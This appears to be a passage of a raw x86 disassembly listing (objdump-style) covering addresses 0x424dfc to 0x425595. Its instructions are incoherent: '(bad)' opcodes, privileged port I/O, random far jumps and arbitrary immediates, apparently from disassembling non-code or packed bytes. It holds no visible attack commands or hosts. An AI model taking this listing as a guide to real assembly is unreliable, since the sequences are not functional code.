  424dfc:	xchg   DWORD PTR [edx+0x7e1d4ee5],ebp
  424e02:	or     esi,edx
  424e04:	sub    dh,BYTE PTR [edi+0x66]
  424e07:	fistp  QWORD PTR [ebp+0x4a]
  424e0a:	pop    ss
  424e0b:	dec    edx
  424e0c:	(bad)  
  424e0d:	push   ss
  424e0e:	inc    ecx
  424e0f:	fdivr  st(2),st
  424e11:	ds mov esi,0xad4bee79
  424e17:	pop    ebp
  424e18:	xchg   ebx,eax
  424e19:	in     eax,0x76
  424e1b:	mov    ecx,0xac89600e
  424e20:	div    DWORD PTR [ebx+0x2550ec41]
  424e26:	ror    BYTE PTR [eax],0x4e
  424e29:	(bad)  
  424e2a:	jnp    0x424dd4
  424e2c:	mov    cl,bh
  424e2e:	cld    
  424e2f:	pop    ss
  424e30:	add    esi,DWORD PTR [ebp+0x3f]
  424e33:	ins    DWORD PTR es:[edi],dx
  424e34:	push   ss
  424e35:	inc    ebx
  424e36:	dec    esi
  424e37:	retf   0xbe87
  424e3a:	in     eax,dx
  424e3b:	xor    al,0x2a
  424e3d:	pop    ss
  424e3e:	push   ss
  424e3f:	test   DWORD PTR ds:0x45980a6d,edi
  424e45:	shl    WORD PTR [ebx-0x1157d25c],1
  424e4c:	stc    
  424e4d:	or     DWORD PTR [eax-0x3f2cf74f],0xffffff9b
  424e54:	dec    edi
  424e55:	lds    ebp,FWORD PTR [esi-0x34]
  424e58:	and    al,0x3f
  424e5a:	stos   BYTE PTR es:[edi],al
  424e5b:	dec    edi
  424e5c:	pusha  
  424e5d:	stos   DWORD PTR es:[edi],eax
  424e5e:	repz lea edi,[ebx+0x49645b13]
  424e65:	mov    al,0x9f
  424e67:	iret   
  424e68:	ja     0x424e16
  424e6a:	pop    eax
  424e6b:	das    
  424e6c:	and    BYTE PTR [ebx],0x6e
  424e6f:	pop    edx
  424e70:	lock mov dl,0x65
  424e73:	rcr    DWORD PTR [ebx+0xa],1
  424e76:	fdivr  DWORD PTR [edx-0x5]
  424e79:	enter  0x4cd6,0x7b
  424e7d:	pop    ebp
  424e7e:	pusha  
  424e7f:	mov    eax,0x5382604d
  424e84:	adc    eax,0x39cef4e
  424e89:	cwde   
  424e8a:	dec    esp
  424e8b:	int3   
  424e8c:	cmp    ecx,0xb480a4fd
  424e92:	aam    0xcb
  424e94:	xchg   ebp,eax
  424e95:	fistp  DWORD PTR ds:0x3b0631b9
  424e9b:	fisttp DWORD PTR [ebx-0x78]
  424e9e:	lahf   
  424e9f:	and    eax,0x36510dfe
  424ea4:	jns    0x424e27
  424ea6:	push   eax
  424ea7:	aad    0x77
  424ea9:	sub    ch,BYTE PTR [esi+0x6bc0df0b]
  424eaf:	fld    TBYTE PTR [ebx]
  424eb1:	test   BYTE PTR [edi],bl
  424eb3:	inc    edi
  424eb4:	mov    bh,0xd5
  424eb6:	std    
  424eb7:	cdq    
  424eb8:	stos   BYTE PTR es:[edi],al
  424eb9:	jne    0x424e64
  424ebb:	loopne 0x424e47
  424ebd:	lods   eax,DWORD PTR ds:[esi]
  424ebe:	fldenv [edi]
  424ec0:	ins    DWORD PTR es:[edi],dx
  424ec1:	xor    esi,esi
  424ec3:	repnz ins DWORD PTR es:[edi],dx
  424ec5:	lods   al,BYTE PTR ds:[esi]
  424ec6:	shl    dh,0xc
  424ec9:	xchg   esp,eax
  424eca:	sbb    BYTE PTR [edx+0x3767459a],bl
  424ed0:	mov    bl,BYTE PTR [edi+0x5c]
  424ed3:	fild   QWORD PTR [esp+ecx*4-0x57ff1174]
  424eda:	jae    0x424e94
  424edc:	(bad)  
  424ede:	xchg   DWORD PTR [si+0x17],ebx
  424ee2:	clc    
  424ee3:	push   es
  424ee4:	out    0xb8,eax
  424ee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ee7:	popf   
  424ee8:	dec    eax
  424ee9:	std    
  424eea:	pop    ebx
  424eeb:	out    dx,al
  424eec:	das    
  424eed:	adc    al,BYTE PTR [ebx]
  424eef:	xor    al,0x7e
  424ef1:	inc    eax
  424ef2:	add    BYTE PTR [eax-0x64885997],al
  424ef8:	out    dx,al
  424ef9:	(bad)  
  424efa:	ror    BYTE PTR [ecx-0xc],cl
  424efd:	in     eax,0x12
  424eff:	loopne 0x424e89
  424f01:	mov    edi,0x5638114e
  424f06:	adc    BYTE PTR [ebx+0x25a0d006],0xb2
  424f0d:	mov    eax,DWORD PTR [esi]
  424f0f:	scas   eax,DWORD PTR es:[edi]
  424f10:	mov    ch,0xa1
  424f12:	sub    esi,esi
  424f14:	stc    
  424f15:	mov    ebx,?
  424f17:	ins    DWORD PTR es:[edi],dx
  424f18:	in     eax,dx
  424f19:	lods   al,BYTE PTR ds:[esi]
  424f1a:	mov    ecx,0xdc1074a0
  424f1f:	shl    BYTE PTR [esi-0x180c1c20],cl
  424f25:	aam    0xdb
  424f27:	jo     0x424efc
  424f29:	mov    eax,ds:0x9501cd0
  424f2e:	cmp    DWORD PTR [edx-0x70],ecx
  424f31:	out    0x4a,eax
  424f33:	jg     0x424ed3
  424f35:	loopne 0x424ee9
  424f37:	out    dx,al
  424f38:	cmp    esp,DWORD PTR [edx-0x1e9f5b3c]
  424f3e:	int3   
  424f3f:	cld    
  424f40:	pop    es
  424f41:	jl     0x424ec7
  424f43:	es adc eax,0x962c59a1
  424f49:	xlat   BYTE PTR ds:[ebx]
  424f4a:	loop   0x424f03
  424f4c:	jns    0x424f8e
  424f4e:	test   eax,0x2c178da1
  424f53:	ds pushw cs
  424f56:	jne    0x424f3a
  424f58:	(bad)  
  424f59:	fld    DWORD PTR [ebx+ebx*2+0x54]
  424f5d:	jecxz  0x424fce
  424f5f:	lods   al,BYTE PTR ds:[esi]
  424f60:	dec    esp
  424f61:	adc    ah,BYTE PTR [ebx+0x2d]
  424f64:	cmp    ebp,DWORD PTR [edi+0x79]
  424f67:	cmp    DWORD PTR [esi+0x64ca0799],ebp
  424f6d:	jge    0x424f13
  424f6f:	dec    DWORD PTR [edi-0x7f44c7e7]
  424f75:	jle    0x424fc3
  424f77:	out    dx,al
  424f78:	ins    BYTE PTR es:[edi],dx
  424f79:	sbb    dh,dh
  424f7b:	sub    ebp,DWORD PTR [esi+0x45]
  424f7e:	jmp    0x424fd1
  424f80:	fisttp QWORD PTR [edx+0x4a]
  424f83:	cdq    
  424f84:	pop    esi
  424f85:	into   
  424f86:	jo     0x424fe6
  424f88:	lods   al,BYTE PTR ds:[esi]
  424f89:	jecxz  0x424f28
  424f8b:	shl    DWORD PTR [edx-0x3b0cacf6],1
  424f91:	loop   0x424f84
  424f93:	jl     0x424fe1
  424f95:	shr    DWORD PTR [ecx],1
  424f97:	call   0x1e28:0x6de69db6
  424f9e:	out    dx,al
  424f9f:	es aas 
  424fa1:	cmp    ecx,DWORD PTR [ebp-0x26]
  424fa4:	lahf   
  424fa5:	mov    DWORD PTR [esi-0x4d],ecx
  424fa8:	imul   eax,DWORD PTR [esi+eiz*1],0x7f
  424fac:	or     eax,0xe5411090
  424fb1:	sub    eax,0x53a182f7
  424fb6:	loopne 0x424fb0
  424fb8:	xchg   edx,eax
  424fb9:	ret    0x4d95
  424fbc:	sbb    dh,BYTE PTR [eax]
  424fbe:	sub    eax,0x3a0e6e4f
  424fc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fc4:	fadd   st,st(2)
  424fc6:	fst    QWORD PTR [esi-0x24]
  424fc9:	mov    dl,0xbb
  424fcc:	fsubr  DWORD PTR [edx-0x5b]
  424fcf:	push   esi
  424fd0:	in     al,dx
  424fd1:	jmp    DWORD PTR [esi]
  424fd3:	jns    0x425016
  424fd5:	mov    dh,0x39
  424fd7:	imul   ecx,DWORD PTR [edx+0x2efa4079],0x63f2e3ef
  424fe1:	aad    0x67
  424fe3:	jne    0x424f7a
  424fe5:	mov    ecx,0xaab0ac27
  424fea:	mov    esp,0xbe321a5c
  424fef:	call   0x52a67076
  424ff4:	or     bl,bl
  424ff6:	push   ds
  424ff7:	pusha  
  424ff8:	sub    cl,BYTE PTR [edi+eax*4]
  424ffb:	jmp    0x57e289d4
  425000:	push   0x32
  425002:	mov    ch,BYTE PTR [edi]
  425004:	stc    
  425005:	push   cs
  425006:	test   al,0x88
  425008:	fild   WORD PTR [ecx+0x7b]
  42500b:	jecxz  0x424fa4
  42500d:	test   BYTE PTR [edx+0x7d],dh
  425010:	fdiv   DWORD PTR [edi+0x6ffa0a58]
  425016:	jp     0x424fe0
  425018:	mul    DWORD PTR [esi-0x226a6c8e]
  42501e:	in     eax,0x18
  425020:	enter  0x54b2,0xd8
  425024:	lods   eax,DWORD PTR ds:[esi]
  425025:	jmp    0x75f7:0x44f13743
  42502c:	test   eax,0x93ad0c77
  425031:	pop    ecx
  425032:	mov    edx,0x3cdad314
  425037:	pop    ecx
  425038:	aaa    
  425039:	pusha  
  42503a:	adc    DWORD PTR [edi-0x530a25f0],edx
  425040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425041:	cmp    ch,BYTE PTR [ebx+0x6b1a4f1f]
  425047:	fld    st(7)
  425049:	in     eax,0xe6
  42504b:	fstp   DWORD PTR [esi-0x6118ea14]
  425051:	sub    al,dh
  425053:	mov    esp,DWORD PTR es:[esi+ecx*4-0x1bf9db86]
  42505b:	lods   eax,DWORD PTR ds:[esi]
  42505c:	in     al,dx
  42505d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42505e:	lds    esp,FWORD PTR [ecx]
  425060:	sbb    cl,al
  425062:	fcmovb st,st(1)
  425064:	push   edi
  425065:	mov    edx,0x9cd3bee4
  42506a:	sub    BYTE PTR [edx],dl
  42506c:	push   0xa457c520
  425071:	shr    DWORD PTR [ebp-0x24],0x88
  425075:	and    cl,bh
  425077:	outs   dx,BYTE PTR ds:[esi]
  425078:	adc    BYTE PTR [edi+0x61d7cc95],dl
  42507e:	je     0x4250ea
  425080:	ret    
  425081:	sub    al,0xa3
  425083:	pop    eax
  425084:	mov    ah,0xe5
  425086:	xor    al,0xf7
  425088:	rcl    BYTE PTR [eax-0x56],0x76
  42508c:	daa    
  42508d:	jae    0x4250d6
  42508f:	outs   dx,DWORD PTR ds:[esi]
  425090:	addr16 jnp 0x4250a4
  425093:	push   0x4c2dba56
  425098:	fwait
  425099:	aaa    
  42509a:	jmp    0xc111:0xe4447bf3
  4250a1:	stos   DWORD PTR es:[edi],eax
  4250a2:	inc    edi
  4250a3:	pop    edx
  4250a4:	mov    bh,BYTE PTR [edx-0x62]
  4250a7:	dec    edi
  4250a8:	push   ss
  4250a9:	fcomp  DWORD PTR [ebp-0x7974fb68]
  4250af:	pop    es
  4250b0:	jo     0x4250a4
  4250b2:	es scas eax,DWORD PTR es:[edi]
  4250b4:	sti    
  4250b5:	mov    ds:0xc484407c,al
  4250ba:	retf   
  4250bb:	sar    DWORD PTR [eax],0x4c
  4250be:	and    DWORD PTR [edx-0x1140b4e5],edi
  4250c4:	mov    ?,ebp
  4250c6:	loope  0x425098
  4250c8:	mov    al,ds:0x12fea0a2
  4250cd:	and    al,0xee
  4250cf:	sbb    eax,0xec579daa
  4250d4:	retf   
  4250d5:	cmp    DWORD PTR [edx-0x2b],ecx
  4250d8:	mov    DWORD PTR [eax-0x584553b9],edi
  4250de:	add    esi,DWORD PTR [ecx]
  4250e0:	jb     0x42506a
  4250e2:	mov    esp,0x222c432e
  4250e7:	(bad)  
  4250e8:	fdiv   DWORD PTR [eax+ecx*2]
  4250eb:	cmc    
  4250ec:	test   eax,0xbfd415d3
  4250f1:	clc    
  4250f2:	fs out dx,eax
  4250f4:	mov    DWORD PTR [esi+0x4a],edx
  4250f7:	xor    BYTE PTR [ecx+ecx*2],bl
  4250fa:	pop    ecx
  4250fb:	jbe    0x425098
  4250fd:	out    dx,al
  4250fe:	sub    DWORD PTR [ebp+ecx*8-0x2],edi
  425102:	sub    ah,BYTE PTR [eax+0x37]
  425105:	inc    esi
  425106:	xor    eax,0x59000004
  42510b:	push   ebp
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x45083796
  425119:	and    DWORD PTR [edx],ebp
  42511b:	fild   WORD PTR [ecx]
  42511d:	add    BYTE PTR [esi+0x25000006],al
  425123:	es in  eax,0xe8
  425126:	test   DWORD PTR [eax],ecx
  425128:	in     eax,dx
  425129:	(bad)  
  42512a:	ds inc esi
  42512c:	and    BYTE PTR [eax],bh
  42512e:	xor    eax,0x5ec11fb5
  425133:	and    al,0x25
  425135:	inc    ebp
  425136:	jl     0x4250c4
  425138:	lock mov ds:0x88b47215,eax
  42513e:	ror    DWORD PTR [ebx-0x54],1
  425141:	dec    edi
  425142:	pop    ss
  425143:	addr16 icebp 
  425145:	ret    
  425146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425147:	mov    WORD PTR [eax+0x4110b864],fs
  42514d:	or     dh,dh
  42514f:	jns    0x42518f
  425151:	inc    ebx
  425152:	add    DWORD PTR [ebp+eiz*2+0x7a27d1d7],0x27
  42515a:	clc    
  42515b:	imul   esp,DWORD PTR [eax],0xffffffc9
  42515e:	mov    ebp,0xc061eff6
  425163:	stos   BYTE PTR es:[edi],al
  425164:	jbe    0x4251c5
  425166:	cli    
  425167:	sbb    eax,0x9d9cc39d
  42516c:	xchg   ebx,eax
  42516d:	add    bl,BYTE PTR [esp+esi*8+0x32]
  425171:	mov    eax,ds:0xf2c7b465
  425176:	inc    ebx
  425177:	inc    ecx
  425178:	popf   
  425179:	push   ebp
  42517a:	sub    ebx,DWORD PTR [edx]
  42517c:	or     ebx,edi
  42517e:	adc    dl,ah
  425180:	into   
  425181:	es div dl
  425184:	imul   edi,DWORD PTR [edx],0x4d
  425187:	stos   BYTE PTR es:[edi],al
  425188:	lods   al,BYTE PTR ds:[esi]
  425189:	inc    eax
  42518a:	push   0x56
  42518c:	inc    di
  42518e:	pop    edx
  42518f:	mov    eax,0x5754f389
  425194:	repnz out dx,al
  425196:	mov    bh,0xa7
  425198:	and    DWORD PTR ds:0xd407121f,edi
  42519e:	ins    BYTE PTR es:[edi],dx
  42519f:	imul   edi,ebp,0xffffffcc
  4251a2:	push   es
  4251a3:	adc    DWORD PTR [ebp-0x19194fc0],ebx
  4251a9:	ss add eax,0x13fe7ed6
  4251af:	push   esp
  4251b0:	push   cs
  4251b1:	rcl    DWORD PTR [eax-0x4fdb2eed],0xc9
  4251b8:	cmp    ebx,ebp
  4251ba:	cmp    al,0x10
  4251bc:	xchg   ebx,eax
  4251bd:	jo     0x425166
  4251bf:	jmp    0x3ada:0xcbabfb38
  4251c6:	enter  0xf626,0x17
  4251ca:	test   al,0xf3
  4251cc:	sbb    DWORD PTR [ebx+0x14e82fea],ebx
  4251d2:	adc    BYTE PTR [ebx],dl
  4251d4:	cmp    esi,DWORD PTR [edx-0x66ff948b]
  4251da:	es fmul st(7),st
  4251dd:	pop    esp
  4251de:	mov    ah,BYTE PTR [ebx-0x10]
  4251e1:	xchg   DWORD PTR [ecx+0x19],esp
  4251e4:	mov    edx,0x6c690650
  4251e9:	jae    0x425177
  4251eb:	ret    
  4251ec:	scas   al,BYTE PTR es:[edi]
  4251ed:	add    eax,edi
  4251ef:	repz push eax
  4251f1:	pop    ecx
  4251f2:	aad    0x7e
  4251f4:	xor    DWORD PTR [edx],ebp
  4251f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251f7:	pop    esi
  4251f8:	inc    esp
  4251f9:	das    
  4251fa:	pop    ebx
  4251fb:	inc    DWORD PTR [edi-0x66a805bf]
  425201:	dec    ecx
  425202:	in     al,0xa3
  425204:	inc    ecx
  425205:	into   
  425206:	sub    DWORD PTR [edx+ebp*1],esp
  425209:	mov    ebp,0x543629a6
  42520e:	or     al,0x4d
  425210:	adc    al,0x87
  425212:	cld    
  425213:	adc    DWORD PTR [eax],eax
  425215:	inc    eax
  425216:	es mov al,0x5d
  425219:	cwde   
  42521a:	inc    ebp
  42521b:	and    esp,DWORD PTR [esi-0x16a9ec3e]
  425221:	xchg   ebx,eax
  425222:	and    BYTE PTR [ecx+0x7a],dl
  425225:	push   eax
  425226:	sub    ah,BYTE PTR [edi-0x5a12c313]
  42522c:	stos   DWORD PTR es:[edi],eax
  42522d:	in     al,0x27
  42522f:	aad    0x44
  425231:	add    dh,BYTE PTR [ecx+0x6]
  425234:	xor    al,dl
  425236:	sbb    eax,ebx
  425238:	retf   0xdb00
  42523b:	popf   
  42523c:	cmp    cl,cl
  42523e:	inc    eax
  42523f:	xor    DWORD PTR [ebx-0x35801443],0xfffffffb
  425246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425247:	cwde   
  425248:	add    eax,0x7b5aed07
  42524d:	adc    ah,BYTE PTR [esi-0x1e]
  425250:	scas   eax,DWORD PTR es:[edi]
  425251:	ins    BYTE PTR es:[edi],dx
  425252:	xor    BYTE PTR [esi+edx*2-0x34],al
  425256:	sub    DWORD PTR [edi-0x464ff3ac],0xfffffffa
  42525d:	push   edi
  42525e:	stc    
  42525f:	(bad)  
  425261:	les    edi,FWORD PTR [edx]
  425263:	leave  
  425264:	sub    eax,0x91235328
  425269:	mov    al,0xa6
  42526b:	mov    ds:0x25940ca2,al
  425270:	sbb    DWORD PTR [eax-0x32],edx
  425273:	aas    
  425274:	cld    
  425275:	inc    edi
  425276:	fild   QWORD PTR [ebx+0x7b]
  425279:	out    dx,eax
  42527a:	cdq    
  42527b:	enter  0x434f,0x28
  42527f:	adc    ebx,DWORD PTR ds:0x305e3f50
  425285:	scas   al,BYTE PTR es:[edi]
  425286:	or     ebx,DWORD PTR [esi+0x32]
  425289:	hlt    
  42528a:	fisub  WORD PTR [edx-0x6c13e762]
  425290:	xor    ebx,esp
  425292:	pop    ecx
  425293:	push   ebp
  425294:	mov    ebp,0x86f6e916
  425299:	test   al,ah
  42529b:	mov    al,ds:0xf2df00a9
  4252a0:	sub    eax,0xbb779183
  4252a5:	xchg   esp,eax
  4252a6:	cmp    al,0xed
  4252a8:	(bad)  
  4252a9:	jle    0x425260
  4252ab:	xlat   BYTE PTR ds:[ebx]
  4252ac:	aaa    
  4252ad:	lods   eax,DWORD PTR ds:[esi]
  4252ae:	jle    0x425264
  4252b0:	mov    esp,0xb7631302
  4252b5:	push   ebp
  4252b6:	cmp    al,0x16
  4252b8:	xor    al,0x4e
  4252ba:	nop    DWORD PTR [ebp+0x58]
  4252be:	cmp    bl,BYTE PTR [ecx+0xcf84974]
  4252c4:	cmp    bh,bl
  4252c6:	cld    
  4252c7:	inc    edx
  4252c8:	adc    al,0xac
  4252ca:	scas   eax,DWORD PTR es:[edi]
  4252cb:	sub    eax,0x548cd03e
  4252d0:	addr16 push edi
  4252d2:	lock mov edx,0x5131bed4
  4252d8:	shl    ch,1
  4252da:	loopne 0x4252d3
  4252dc:	lods   eax,DWORD PTR ds:[esi]
  4252dd:	icebp  
  4252de:	cmp    ebp,edi
  4252e0:	mov    eax,ds:0xfd83701c
  4252e5:	frstor [ebp+0x7b]
  4252e8:	fsubr  DWORD PTR [eax-0x70]
  4252eb:	dec    edi
  4252ec:	in     eax,dx
  4252ed:	or     bh,BYTE PTR [ecx+0x77]
  4252f0:	je     0x42527c
  4252f2:	sub    bh,BYTE PTR fs:[edx-0x54]
  4252f6:	lahf   
  4252f7:	push   ecx
  4252f8:	mov    ah,0x26
  4252fa:	jbe    0x4252a5
  4252fc:	popf   
  4252fd:	sub    al,ch
  4252ff:	not    DWORD PTR [eax+0xa03ff9d]
  425305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425306:	mov    edx,0x369d0471
  42530b:	mov    dl,0x81
  42530d:	and    esp,ebx
  42530f:	scas   al,BYTE PTR es:[edi]
  425310:	nop
  425311:	jge    0x42533f
  425313:	cmp    ebp,DWORD PTR ds:[ecx-0x52d6564f]
  42531a:	out    0x67,al
  42531c:	test   al,0x11
  42531e:	xchg   ebx,eax
  42531f:	and    BYTE PTR [edi],al
  425321:	test   BYTE PTR cs:[ecx],ah
  425324:	dec    ecx
  425325:	lods   eax,DWORD PTR ds:[esi]
  425326:	pop    ebx
  425327:	inc    edi
  425328:	mov    al,0x3f
  42532a:	dec    edx
  42532b:	xchg   ecx,eax
  42532c:	outs   dx,BYTE PTR ds:[esi]
  42532d:	dec    ebx
  42532e:	sbb    eax,DWORD PTR [edx+0x36]
  425331:	jmp    0x4252c4
  425333:	imul   ebp,DWORD PTR [edx+0x7f],0x14a6f7e0
  42533a:	dec    esp
  42533b:	mov    DWORD PTR [ecx+0x46],ebp
  42533e:	dec    eax
  42533f:	push   0x29
  425341:	and    al,0xc3
  425343:	(bad)  
  425344:	jmp    0x45184419
  425349:	add    bh,BYTE PTR [esi+edx*4]
  42534c:	jp     0x42538b
  42534e:	loope  0x4252e7
  425350:	xchg   edx,eax
  425351:	fmul   QWORD PTR [eax+0x5a1804d5]
  425357:	cmp    ch,dh
  425359:	push   edi
  42535a:	xchg   esi,eax
  42535c:	cs in  eax,0x5e
  42535f:	cmc    
  425360:	or     DWORD PTR [edi+0x7e],0x37
  425364:	push   ds
  425365:	and    dl,BYTE PTR [esi-0x2252407c]
  42536b:	jb     0x425357
  42536d:	pop    ds
  42536e:	test   BYTE PTR [eax],bl
  425370:	test   BYTE PTR [edx-0x64],dh
  425373:	sub    eax,0xabe982a0
  425378:	sbb    ch,bl
  42537a:	mov    eax,0xbc60b5c0
  42537f:	arpl   WORD PTR [esi+edx*8+0x40],bp
  425383:	in     eax,0xee
  425385:	xchg   edx,eax
  425386:	mov    cl,0x0
  425388:	inc    ecx
  425389:	int3   
  42538a:	out    0xf8,al
  42538c:	or     bh,BYTE PTR [ecx]
  42538e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42538f:	mov    dl,0x88
  425391:	cmp    eax,0x600e2ce8
  425396:	mul    edx
  425398:	inc    esi
  425399:	clc    
  42539a:	aam    0xaf
  42539c:	sub    cl,al
  42539e:	lock mov ecx,edx
  4253a1:	mov    esp,0x266b4f2f
  4253a6:	idiv   DWORD PTR [esi]
  4253a8:	dec    edi
  4253a9:	shr    BYTE PTR [edx-0x5],cl
  4253ac:	inc    ecx
  4253ad:	sub    BYTE PTR [ebp+0x617ca640],al
  4253b3:	push   es
  4253b4:	or     BYTE PTR [ebp-0x68],dh
  4253b7:	dec    esi
  4253b8:	je     0x425418
  4253ba:	mov    BYTE PTR [edx-0x39b01380],cl
  4253c0:	dec    esp
  4253c1:	iret   
  4253c2:	mov    dh,0xa7
  4253c4:	inc    ebx
  4253c5:	sbb    ecx,DWORD PTR [ebx-0x415224c]
  4253cb:	push   edi
  4253cc:	dec    esp
  4253cd:	mov    bl,0xf4
  4253cf:	addr16 pushf 
  4253d1:	mov    dh,0x69
  4253d3:	fnstcw WORD PTR [edx]
  4253d5:	mov    ch,0x7
  4253d7:	rcr    BYTE PTR [esi+0x54bc46ff],cl
  4253dd:	rcr    BYTE PTR [ecx],1
  4253df:	cld    
  4253e0:	xchg   edi,eax
  4253e1:	sub    al,0x4c
  4253e3:	shl    DWORD PTR [ebp+0x4ae738fa],1
  4253e9:	cwde   
  4253ea:	mov    eax,0x87c56f39
  4253ef:	or     eax,0x379e1290
  4253f4:	ins    DWORD PTR es:[edi],dx
  4253f5:	add    dl,0x75
  4253f8:	mov    dh,0xa9
  4253fa:	pop    ss
  4253fb:	icebp  
  4253fc:	(bad)  
  4253fd:	test   BYTE PTR [edi+0x332cf22b],0x79
  425404:	xchg   esp,eax
  425405:	hlt    
  425406:	push   ds
  425407:	test   eax,0x3c757832
  42540c:	enter  0x3a68,0x74
  425410:	and    eax,0x5eafb9ad
  425415:	out    dx,al
  425416:	mov    ebp,0x94870ca9
  42541b:	lock adc bh,BYTE PTR [esi-0x7286ec01]
  425422:	dec    esp
  425423:	ret    
  425424:	cmp    DWORD PTR [esi],esi
  425426:	or     DWORD PTR fs:[eax+0x2c724afd],ecx
  42542d:	pop    edi
  42542e:	mov    eax,0xff58845
  425433:	or     al,0xcf
  425435:	test   eax,0x68362f58
  42543a:	scas   eax,DWORD PTR es:[edi]
  42543b:	mov    DWORD PTR [edx+0x67270266],esp
  425441:	int3   
  425442:	inc    edi
  425443:	(bad)  [ebx]
  425445:	xchg   edi,eax
  425446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425447:	jecxz  0x425443
  425449:	dec    edi
  42544a:	xchg   edi,eax
  42544b:	adc    BYTE PTR [ebx+0x72],ch
  42544e:	sub    DWORD PTR [eax+0x4759bf0],ecx
  425454:	lea    edx,[ebp-0x5d3f01e5]
  42545a:	jnp    0x425493
  42545c:	shl    DWORD PTR [eax-0x1a],cl
  42545f:	mov    bh,0x30
  425461:	arpl   di,dx
  425463:	lds    edi,FWORD PTR [edi-0x4ce412c9]
  425469:	dec    esp
  42546a:	test   al,0xdb
  42546c:	jmp    0x586b:0x2f142f8c
  425473:	cmp    DWORD PTR [edx-0x78],eax
  425476:	cmp    DWORD PTR [esp+esi*2+0x334d1ab0],esi
  42547d:	sbb    ebx,ecx
  42547f:	inc    edx
  425480:	pushf  
  425481:	xchg   edi,eax
  425482:	ss fwait
  425484:	sbb    al,0xc9
  425486:	and    esp,edi
  425488:	xchg   ebx,eax
  425489:	jecxz  0x4254f1
  42548b:	ds popfw 
  42548e:	dec    ebp
  42548f:	cs xchg ebp,eax
  425491:	test   BYTE PTR [ebp+0x64bf234d],dh
  425497:	add    eax,0xcfa8ad50
  42549c:	add    al,cl
  42549e:	lods   eax,DWORD PTR ds:[esi]
  42549f:	(bad)  
  4254a0:	stc    
  4254a1:	out    dx,al
  4254a2:	or     esi,edx
  4254a4:	leave  
  4254a5:	(bad)  
  4254a6:	hlt    
  4254a7:	aad    0xe1
  4254a9:	jb     0x4254b2
  4254ab:	sbb    edx,0xffffffe8
  4254ae:	cmp    eax,0x85209327
  4254b3:	pop    es
  4254b4:	pop    edx
  4254b5:	mov    ebx,0x95859ba9
  4254ba:	push   0x42129559
  4254bf:	xlat   BYTE PTR ds:[ebx]
  4254c0:	inc    esi
  4254c1:	pop    ebx
  4254c2:	inc    esp
  4254c3:	pop    edx
  4254c4:	(bad)  
  4254c6:	or     al,0x7d
  4254c8:	scas   al,BYTE PTR es:[edi]
  4254c9:	jmp    0x74b:0xc5a5904
  4254d0:	mov    gs,ebx
  4254d2:	rol    DWORD PTR [edx-0x16],0xb9
  4254d6:	dec    edi
  4254d7:	xchg   edx,eax
  4254d8:	push   eax
  4254d9:	xor    al,0xa8
  4254db:	sub    ah,BYTE PTR [ebx]
  4254dd:	jb     0x4254e9
  4254df:	adc    al,0x8f
  4254e1:	es pop esp
  4254e3:	sub    dl,ch
  4254e5:	xchg   esp,eax
  4254e6:	push   ecx
  4254e7:	fld    DWORD PTR [ebp-0x4ead94fb]
  4254ed:	arpl   WORD PTR [ebx+0x564faca7],cx
  4254f3:	leave  
  4254f4:	loope  0x425568
  4254f6:	fmul   DWORD PTR [ebp-0x61cba473]
  4254fc:	pop    ebp
  4254fd:	mov    DWORD PTR [edi+0x60],ecx
  425500:	push   eax
  425501:	iret   
  425502:	adc    BYTE PTR [ebx],0xe2
  425505:	sub    cl,ah
  425507:	dec    ebp
  425508:	xchg   ebx,eax
  425509:	jbe    0x425505
  42550b:	mov    BYTE PTR [edx+ebx*2+0x5e],ch
  42550f:	jno    0x4254d6
  425511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425512:	push   edx
  425513:	xor    BYTE PTR [edi],0x9d
  425516:	mov    dl,0xd2
  425518:	out    dx,al
  425519:	add    eax,DWORD PTR [edx]
  42551b:	mov    WORD PTR [ebp-0x5533de9f],gs
  425521:	mov    dh,0xa5
  425523:	inc    eax
  425524:	pop    ebx
  425525:	push   ds
  425526:	lods   al,BYTE PTR ds:[esi]
  425527:	push   ds
  425528:	scas   al,BYTE PTR es:[edi]
  425529:	in     al,dx
  42552a:	jnp    0x51c4bc0e
  425530:	add    ebp,DWORD PTR [ecx-0x216b99df]
  425536:	mov    eax,0xb4c8c5f6
  42553b:	outs   dx,DWORD PTR ds:[esi]
  42553c:	stos   DWORD PTR es:[edi],eax
  42553d:	fsubr  st,st(7)
  42553f:	cwde   
  425540:	and    al,0x78
  425542:	pop    ss
  425543:	xlat   BYTE PTR ds:[ebx]
  425544:	mov    dh,0xe3
  425546:	add    BYTE PTR [ebx+0x72a24680],ch
  42554c:	and    dl,ah
  42554e:	pop    esp
  42554f:	pusha  
  425550:	mov    ebx,0x934c5993
  425555:	enter  0xfe27,0xcd
  425559:	or     DWORD PTR [ecx],esp
  42555b:	js     0x425509
  42555d:	xlat   BYTE PTR ds:[ebx]
  42555e:	(bad)  
  42555f:	stos   DWORD PTR es:[edi],eax
  425560:	push   cs
  425561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425562:	retf   
  425563:	and    DWORD PTR [eax],esp
  425565:	pop    ss
  425566:	mov    edx,0x28096b2b
  42556b:	(bad)  
  42556d:	lahf   
  42556e:	add    esp,DWORD PTR [ebx-0xcaaaf3]
  425574:	das    
  425575:	clc    
  425576:	xor    DWORD PTR ds:0x7192a139,edx
  42557c:	das    
  42557d:	cli    
  42557e:	cmp    ch,BYTE PTR [edx-0x4f]
  425581:	shl    BYTE PTR [ecx-0x4d61ec8a],0x64
  425588:	ins    DWORD PTR es:[edi],dx
  425589:	adc    ah,BYTE PTR [ebx+0x5abe2caa]
  42558f:	dec    ebx
  425590:	(bad)  
  425591:	out    dx,al
  425592:	rcl    ah,0xa6
  425595:	pop    edi
